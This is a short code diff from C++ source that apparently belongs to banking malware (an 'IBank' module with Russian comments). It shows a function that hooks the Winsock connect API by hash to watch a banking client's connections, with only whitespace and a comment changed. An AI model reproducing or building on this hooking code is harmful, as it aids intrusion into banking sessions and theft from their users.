@@ -213,14 +213,14 @@ namespace IBank
 	}
 	//-----------------------------------------------------------------------
 
- 	void SetHooks()
+	void SetHooks()
 	{
 		// Устанавливаем треуемые хуки
 		IBDBG( "IBank", "Ставим хуки для %s", System->Name );
 
 		// Ставим хук на подключение к серверу, для определения момента закрыти
 		// системы
-		const DWORD HASH_connect = 0xedd8fe8a;
+		const DWORD HASH_connect = 0xEDD8FE8A /* connect */;
 		if ( HookApi( DLL_WINSOCK, HASH_connect, &Hook_Connect ) )
 		{
 			__asm mov [Real_Connect], eax
